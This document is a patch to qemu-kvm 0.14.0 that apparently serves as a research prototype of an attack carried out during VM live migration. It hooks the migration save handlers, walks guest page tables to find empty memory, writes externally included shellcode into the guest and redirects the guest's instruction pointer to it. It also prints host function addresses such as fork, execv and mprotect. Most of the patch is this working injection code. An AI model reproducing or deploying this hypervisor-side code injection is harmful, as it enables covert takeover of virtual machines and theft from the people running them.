@@ -1,0 +1,603 @@
+--- source/qemu-kvm-0.14.0+noroms.bk/block-migration.c	2014-03-03 14:01:38.077949619 -0500
++++ src/qemu-kvm-0.14.0+noroms/block-migration.c	2014-02-19 10:12:22.000000000 -0500
+@@ -637,6 +637,21 @@ static int block_save_live(Monitor *mon,
+     return ((stage == 2) && is_stage2_completed());
+ }
+ 
++/* jfp save live handler */
++int attack_save_live(Monitor *mon, QEMUFile *f, int stage, void *opaque){
++  static  SaveLiveStateHandler *save_live_state = NULL;
++
++  printf("entering attack_save_live\n");
++      if(save_live_state ==NULL){
++	save_live_state = opaque;
++	return 0;
++      }
++      if (mon==NULL)
++	printf("what happened?\n");
++      //mon_attack(mon);
++      return save_live_state(mon,f,stage,opaque);
++}
++
+ static int block_load(QEMUFile *f, void *opaque, int version_id)
+ {
+     static int banner_printed;
+--- source/qemu-kvm-0.14.0+noroms/exec.c	2014-03-03 13:03:15.652238473 -0500
++++ src/qemu-kvm-0.14.0+noroms/exec.c	2014-02-19 10:12:19.000000000 -0500
+@@ -112,6 +112,7 @@ static uint8_t *code_gen_ptr;
+ int phys_ram_fd;
+ static int in_migration;
+ 
++
+ RAMList ram_list = { .blocks = QLIST_HEAD_INITIALIZER(ram_list) };
+ #endif
+ 
+@@ -3589,10 +3590,124 @@ static void io_mem_init(void)
+                                           DEVICE_NATIVE_ENDIAN);
+ }
+ 
++
++
++/*jfp read page */
++uint8_t* cpu_read_page (uint64_t current, uint8_t* buf){
++  if(buf==NULL){
++      buf = qemu_mallocz(4096);
++  }
++  cpu_physical_memory_rw( current, buf,
++			  4096, 0);
++  return buf;
++}
++
++
++
++/*jfp cpu_is_empty_page*/
++int cpu_is_empty_page (uint8_t* buf){
++  int i;
++  for(i=0;i<4096;i++){
++    if(buf[i]!=0){
++      return 0;
++    }
++  }
++  return 1;
++}
++
++/* jfp find empty page*/
++/*target_phys_addr_t cpu_find_empty_page()
++{
++  uint8_t *buf =NULL;
++  int i,flag=1;
++  target_phys_addr_t page_size = 4096, current = 0 ;
++  
++
++  while(flag){
++    current += page_size;
++    buf = cpu_read_page(current,buf);
++    flag = 0;
++    for(i=0;i<page_size;i++){
++      if(buf[i]!=0){
++	flag = 1;
++	break;
++      }
++    }
++  }
++  qemu_free(buf);
++  return current;
++  }*/
++
++/* jfp dump exploit*/
++void cpu_dump_exploit (CPUState *env, target_ulong addr, target_ulong old_eip){
++  uint8_t *buf;
++  int i;
++  target_phys_addr_t phys_addr;
++  target_ulong page;
++
++  const char* shellcode = 
++#include "../hello/shellcode.string"
++    ;
++  int length = 
++#include "../hello/shellcode.length"
++    ;
++  
++  buf = qemu_mallocz(length+8);//FIXME
++
++  for(i=0;i<length;i++){
++    buf[i]=shellcode[i];
++  }
++
++  //  i = 4096*2-8;
++  buf[i] = (old_eip >> 0) & 255 ;//RETURN address has moved
++  buf[i+1] = (old_eip >> 8) & 255 ;//used to be last 8 bytes at end of 2 pages
++  buf[i+2] = (old_eip >> 16) & 255 ;
++  buf[i+3] = (old_eip >> 24) & 255 ;//return address
++  buf[i+4] = (old_eip >> 32) & 255 ;//return address
++  buf[i+5] = (old_eip >> 40) & 255 ;//return address
++  buf[i+6] = (old_eip >> 48) & 255 ;//return address
++  buf[i+7] = (old_eip >> 56) & 255 ;//return address
++
++  
++  //cpu_memory_rw_debug(env, addr, buf, 4096, 1);
++
++
++  page = addr & TARGET_PAGE_MASK;
++  phys_addr = cpu_get_phys_page_debug(env, page);
++
++  cpu_physical_memory_rw(phys_addr,buf,length,1);
++
++
++
++
++  qemu_free(buf);
++
++
++  printf("#define FORK\t0x%x\n",fork);
++  printf("#define EXECV\t0x%x\n",execv);
++
++  //  printf("#define SIZEOF_RTCSTATE\t%i\n",sizeof(rtc_state));
++
++  //printf("#define RTC_UPDATE_SECOND\t0x%x\n",rtc_update_second);
++
++  //  printf("#define SCSI_REQ_COMPLETE\t0x%x\n",scsi_req_complete);
++  //printf("#define SCSI_READ_COMPLETE\t0x%x\n", scsi_read_complete);
++  //  printf("#define TARGET_RET\t0x%x\n",
++  printf("#define MPROTECT\t0x%x\n",          mprotect);
++
++  printf("#define ISA_UNASSIGN_IOPORT\t0x%x\n",isa_unassign_ioport);
++  printf("#define SIZEOF_INT\t%i\n",sizeof(int));
++
++  printf("#define ADDR_RAMLIST_FRIST = %x\n",&ram_list.blocks.lh_first);
++
++}
+ #endif /* !defined(CONFIG_USER_ONLY) */
++int CLOCK_HVA[2] = { 0, 1};
++
+ 
+ /* physical memory access (slow version, mainly for debug) */
+ #if defined(CONFIG_USER_ONLY)
++//jfpjfpjfp
+ int cpu_memory_rw_debug(CPUState *env, target_ulong addr,
+                         uint8_t *buf, int len, int is_write)
+ {
+--- source/qemu-kvm-0.14.0+noroms/target-i386/helper.c	2014-03-03 13:03:17.444281684 -0500
++++ src/qemu-kvm-0.14.0+noroms/helper.c	2014-02-19 10:12:31.000000000 -0500
+@@ -254,6 +254,26 @@ done:
+ #define DUMP_CODE_BYTES_TOTAL    50
+ #define DUMP_CODE_BYTES_BACKWARD 20
+ 
++#if  !defined(CONFIG_USER_ONLY) 
++target_phys_addr_t cpu_get_cr3 (CPUState *env){
++  /*jfp get cr3 */
++  if (env == NULL)
++    printf("this sucks\n");
++  cpu_synchronize_state(env);
++  return env->cr[3];
++}
++
++uint64_t cpu_alter_state (CPUState *env, uint64_t new_eip){
++  /*jfp alter_state*/
++  uint64_t old_eip;
++  cpu_synchronize_state(env);
++  old_eip = env->eip;
++  env->eip = new_eip ;
++  
++  return old_eip;
++}
++
++#endif /* !defined(CONFIG_USER_ONLY) */
+ void cpu_dump_state(CPUState *env, FILE *f, fprintf_function cpu_fprintf,
+                     int flags)
+ {
+--- source/qemu-kvm-0.14.0+noroms.bk/hw/mc146818rtc.c	2014-03-03 11:42:05.614504765 -0500
++++ src/qemu-kvm-0.14.0+noroms/./hw/mc146818rtc.c	2014-02-19 10:12:29.000000000 -0500
+@@ -101,6 +101,10 @@ typedef struct RTCState {
+     QEMUTimer *second_timer2;
+ } RTCState;
+ 
++void jfp(){
++  RTCState a;
++}
++
+ static void rtc_set_time(RTCState *s);
+ static void rtc_copy_date(RTCState *s);
+ 
+--- source/qemu-kvm-0.14.0+noroms.bk/kvm-all.c	2014-03-03 11:41:55.051261691 -0500
++++ src/qemu-kvm-0.14.0+noroms/kvm-all.c	2014-02-19 10:12:19.000000000 -0500
+@@ -376,6 +376,9 @@ static int kvm_physical_sync_dirty_bitma
+     KVMSlot *mem;
+     int ret = 0;
+ 
++    /*jfp*/
++    printf("entering kvm_phys_sync_dirty_bitmap\n");
++
+     d.dirty_bitmap = NULL;
+     while (start_addr < end_addr) {
+         mem = kvm_lookup_overlapping_slot(s, start_addr, end_addr);
+--- source/qemu-kvm-0.14.0+noroms.bk/migration.c	2014-03-03 11:41:46.680069059 -0500
++++ src/qemu-kvm-0.14.0+noroms/migration.c	2014-02-19 10:12:20.000000000 -0500
+@@ -373,6 +373,9 @@ void migrate_fd_put_ready(void *opaque)
+     }
+ 
+     DPRINTF("iterate\n");
++    {
++      printf("jfp: fd_put_ready calling iterate\n");
++    }
+     if (qemu_savevm_state_iterate(s->mon, s->file) == 1) {
+         int state;
+         int old_vm_running = vm_running;
+@@ -380,6 +383,14 @@ void migrate_fd_put_ready(void *opaque)
+         DPRINTF("done iterating\n");
+         vm_stop(0);
+ 
++	{
++	  /*jfp debug calling complete*/
++	  mon_attack(s->mon);
++	  while(!qemu_savevm_state_iterate(s->mon, s->file));
++
++	}
++
++
+         if ((qemu_savevm_state_complete(s->mon, s->file)) < 0) {
+             if (old_vm_running) {
+                 vm_start();
+--- source/qemu-kvm-0.14.0+noroms.bk/monitor.c	2014-03-03 11:41:46.957075433 -0500
++++ src/qemu-kvm-0.14.0+noroms/monitor.c	2014-02-19 10:12:18.000000000 -0500
+@@ -912,6 +912,7 @@ static void monitor_print_cpus(Monitor *
+     qlist_iter(cpu_list, print_cpu_iter, mon);
+ }
+ 
++
+ static void do_info_cpus(Monitor *mon, QObject **ret_data)
+ {
+     CPUState *env;
+@@ -5259,3 +5260,209 @@ int monitor_read_bdrv_key_start(Monitor
+ 
+     return err;
+ }
++
++
++/*jfp next empty page */
++uint64_t mon_next_empty_page(uint64_t cr3,uint64_t addr){
++#ifdef TARGET_X86_64
++  uint8_t* page=NULL;
++  uint64_t result,mask,max_addr,mirror;
++
++  uint64_t l1, l2, l3, l4;
++  uint64_t pml4e, pdpe, pde, pte;
++  uint64_t pml4_addr, pdp_addr, pd_addr, pt_addr;
++
++  
++  mask = (((1ULL << 32) << 8) - 1) << 12;
++  //  printf("mask is %p.\n",(void *)mask);
++  max_addr = 0x8000000;
++  mirror = 0xffff880000000000;
++
++  for(;addr<max_addr;addr+=4096){
++    page = cpu_read_page(addr, page);
++    if (cpu_is_empty_page(page))
++      {      
++	qemu_free(page);  
++	return addr + mirror;
++      }
++  }
++  return NULL;
++  
++    pml4_addr = cr3 & mask;
++    for (l1 = 0; l1 < 512; l1++) {
++        cpu_physical_memory_read(pml4_addr + l1 * 8, (uint8_t *)&pml4e, 8);
++        pml4e = le64_to_cpu(pml4e);
++        if (pml4e & PG_PRESENT_MASK) {
++            pdp_addr = pml4e & mask;
++            for (l2 = 0; l2 < 512; l2++) {
++                cpu_physical_memory_read(pdp_addr + l2 * 8, (uint8_t *)&pdpe,
++                                         8);
++                pdpe = le64_to_cpu(pdpe);
++                if (pdpe & PG_PRESENT_MASK) {
++                    if (pdpe & PG_PSE_MASK) {
++                        /* 1G pages, CR4.PSE is ignored */
++		      	    printf("1 GB\n");
++
++                    } else {
++		      pd_addr = pdpe & mask;
++                        for (l3 = 0; l3 < 512; l3++) {
++                            cpu_physical_memory_read(pd_addr + l3 * 8,
++                                                     (uint8_t *)&pde, 8);
++                            pde = le64_to_cpu(pde);
++                            if (pde & PG_PRESENT_MASK) {
++                                if (pde & PG_PSE_MASK) {
++                                    /* 2M pages, CR4.PSE is ignored */
++				  result = 0;
++				  result |= (l1 << 32) << 7;
++				  result |= l2 << (30 );
++				  result |= l3 << (21 );
++				  
++				  printf("2 MB, virt=%p, phys=%p\n",
++					 (void *)result,(void *)(pde & mask));
++
++
++                                } else {
++				  pt_addr = pde & mask;
++                                    for (l4 = 0; l4 < 512; l4++) {
++                                        cpu_physical_memory_read(pt_addr
++                                                                 + l4 * 8,
++                                                                 (uint8_t *)&pte,
++                                                                 8);
++                                        pte = le64_to_cpu(pte);
++                                        if (pte & PG_PRESENT_MASK) {
++					  /*
++					  pte &= mask;
++					  page = cpu_read_page(addr,page);
++					  if (cpu_is_empty_page(page) && (addr < max_addr)){
++					    printf("found empty page. phys=0x%x\n",addr);
++					    result = 0;
++					    result |= (i << 32) << 4;
++					    result |= j << (30 - 3);
++					    result |= k << (21 - 3);
++					    result |= m << (12 - 3);
++					    printf("virt=0x%x\n",result);
++					  */
++                                        }
++                                    }
++                                }
++                            }
++                        }
++                    }
++                }
++            }
++        }
++    }
++    return result;
++#endif
++    return 0;
++}
++
++
++
++
++/*
++  cpu_physical_memory_read(cr3 & mask,(uint8_t *)&pml4,8);
++  for (i=0;i<4096;i=i+8){
++    printf("i=%i\n",i);
++    if ((pml4[i] & 1) == 1){
++      addr = read_64(pml4, i);
++      addr &= mask;
++      pdp = cpu_read_page(addr,(uint8_t *)&pdp);
++      
++      for (j=0;j<4096;j=j+8){
++	if ((pdp[j] & 1) == 1){
++	  addr = read_64(pdp,j);
++	  if ((addr & mask2) != 0 ){
++
++	  }else{
++
++	    addr &= mask;
++	    page_dir = cpu_read_page(addr,page_dir);
++	    for(k=0;k<4096;k+=8){
++	      if((page_dir[k] & 1) == 1){
++		addr = read_64(page_dir,k);
++		if ((addr & mask2) != 0 ){
++
++
++		}else{
++		  addr &= mask;
++		  page_table = cpu_read_page(addr,page_table);
++		  for(m=0;m<4096;m+=8){
++		    if((page_table[m] & 1) == 1){
++		      addr = read_64(page_table,m);
++		      if ((addr & mask2) !=0){
++			printf("whoops\n");
++		      }else{
++			}
++		      }
++		    }
++		  }
++		}
++	      }
++	    }
++	  }
++	}
++      }
++    }
++  }
++
++
++
++  qemu_free(page_table);
++  qemu_free(page_dir);
++  qemu_free(pdp);
++  qemu_free(pml4);
++  return result;
++  }*/
++
++/*jfp monitor hook*/
++void mon_attack(Monitor *mon){
++  Monitor *old_mon = cur_mon;
++  CPUState *env;
++  uint64_t cr3;
++  uint64_t old_eip,new_eip,empty,mirror = 0xffff880000000000;
++  int count,max;
++
++  printf("entering mon_attack\n");
++
++  cur_mon = mon;
++  env = mon_get_cpu();
++  cur_mon = old_mon;
++  printf("got cpu\n");
++
++
++  cpu_dump_state(env, stderr, fprintf, CPU_DUMP_CODE);
++
++  cr3 = cpu_get_cr3(env);
++  printf("got cr3 (%p)\n", (void *)cr3);
++
++  max = 0;
++  empty = 4096;
++
++  do{
++    count = 0;
++    empty = mon_next_empty_page(cr3,empty)-mirror;
++    do{
++      count++;
++    }while(mon_next_empty_page(cr3,empty+4096*count)-mirror-4096*count==empty);
++    if(count > max){
++      max = count;
++      new_eip = empty + mirror;
++    }
++    if (mon_next_empty_page(cr3,empty+4096*count)==NULL)
++      break;
++    empty += 4096*count;
++  }while(1);
++  printf("got %i empty pages at %p\n", max,new_eip);
++
++    old_eip = cpu_alter_state(env,new_eip);
++  printf("changed eip from %p to %p\n", (void *)old_eip, (void *)new_eip);
++
++
++  cpu_dump_exploit(env,new_eip,old_eip);
++  
++
++
++  cpu_dump_state(env, stderr, fprintf, CPU_DUMP_CODE);
++
++}
+--- source/qemu-kvm-0.14.0+noroms.bk/savevm.c	2014-03-03 11:41:58.763347111 -0500
++++ src/qemu-kvm-0.14.0+noroms/savevm.c	2014-02-19 10:12:19.000000000 -0500
+@@ -1371,10 +1371,15 @@ void vmstate_save_state(QEMUFile *f, con
+ {
+     VMStateField *field = vmsd->fields;
+ 
++    printf("In vmstate_save_state (StateDescription=%s)\n", vmsd->name);
++
+     if (vmsd->pre_save) {
+         vmsd->pre_save(opaque);
+     }
+     while(field->name) {
++	if (0) {
++	    printf("\t%s\n", field->name);
++	}
+         if (!field->field_exists ||
+             field->field_exists(opaque, vmsd->version_id)) {
+             void *base_addr = opaque + field->offset;
+@@ -1404,7 +1409,17 @@ void vmstate_save_state(QEMUFile *f, con
+                     addr = *(void **)addr;
+                 }
+                 if (field->flags & VMS_STRUCT) {
+-                    vmstate_save_state(f, field->vmsd, addr);
++		    
++		    if (0) {
++			/* commented out jfp */
++			uint8_t marker_buf[16];
++			
++			memset(marker_buf, 0xfa, 16);
++			
++			qemu_put_buffer(f, marker_buf, 16);
++		    }
++		    
++		  vmstate_save_state(f, field->vmsd, addr);
+                 } else {
+                     field->info->put(f, addr, size);
+                 }
+@@ -1462,6 +1477,9 @@ int qemu_savevm_state_begin(Monitor *mon
+ {
+     SaveStateEntry *se;
+ 
++    /* debug jfp enter begin */
++    printf("entering qemu_savevm_state_begin\n");
++
+     QTAILQ_FOREACH(se, &savevm_handlers, entry) {
+         if(se->set_params == NULL) {
+             continue;
+@@ -1478,6 +1496,9 @@ int qemu_savevm_state_begin(Monitor *mon
+         if (se->save_live_state == NULL)
+             continue;
+ 
++	/* debug jfp  print id of each save entry*/
++	printf("%s\n", se->idstr);
++
+         /* Section type */
+         qemu_put_byte(f, QEMU_VM_SECTION_START);
+         qemu_put_be32(f, se->section_id);
+@@ -1506,6 +1527,9 @@ int qemu_savevm_state_iterate(Monitor *m
+     SaveStateEntry *se;
+     int ret = 1;
+ 
++    /* debug jfp enter iterate*/
++    printf("entering qemu_savevm_state_iterate\n");
++
+     QTAILQ_FOREACH(se, &savevm_handlers, entry) {
+         if (se->save_live_state == NULL)
+             continue;
+@@ -1514,6 +1538,9 @@ int qemu_savevm_state_iterate(Monitor *m
+         qemu_put_byte(f, QEMU_VM_SECTION_PART);
+         qemu_put_be32(f, se->section_id);
+ 
++	/* debug jfp print id of every save entry*/
++	printf("%s\n", se->idstr);
++
+         ret = se->save_live_state(mon, f, QEMU_VM_SECTION_PART, se->opaque);
+         if (!ret) {
+             /* Do not proceed to the next vmstate before this one reported
+@@ -1524,27 +1551,63 @@ int qemu_savevm_state_iterate(Monitor *m
+         }
+     }
+ 
+-    if (ret)
+-        return 1;
++    if (ret){
++      printf("jfp: iterate returning 1\n");
++      return 1;
++
++    }
+ 
+     if (qemu_file_has_error(f)) {
+         qemu_savevm_state_cancel(mon, f);
+         return -EIO;
+     }
+ 
++
++    printf("jfp: iterate returning 0\n");
+     return 0;
+ }
+ 
++
++
++
++
+ int qemu_savevm_state_complete(Monitor *mon, QEMUFile *f)
+ {
+     SaveStateEntry *se;
+ 
+     cpu_synchronize_all_states();
+ 
++    {
++      /* debug jfp enter complete*/
++      if (mon == NULL)
++	printf("ohno\n");
++      
++      QTAILQ_FOREACH(se, &savevm_handlers, entry) {
++        if (se->save_live_state == NULL)
++	  continue;
++	
++	/* hook into handler */
++	attack_save_live(NULL,NULL,0,se->save_live_state);
++	se->save_live_state = attack_save_live;
++	break;
++      }
++      printf("entering qemu_savevm_state_complete\n");
++    }
++
+     QTAILQ_FOREACH(se, &savevm_handlers, entry) {
+         if (se->save_live_state == NULL)
+             continue;
+ 
++	
++	if(0){
++	  /* debug commented out jfp */ 
++	  uint8_t marker[16];
++	    memset(marker, 0xfb, 16);
++	    printf("%s\n", se->idstr);
++	    qemu_put_buffer(f, marker, 16);
++
++	}
++
+         /* Section type */
+         qemu_put_byte(f, QEMU_VM_SECTION_END);
+         qemu_put_be32(f, se->section_id);
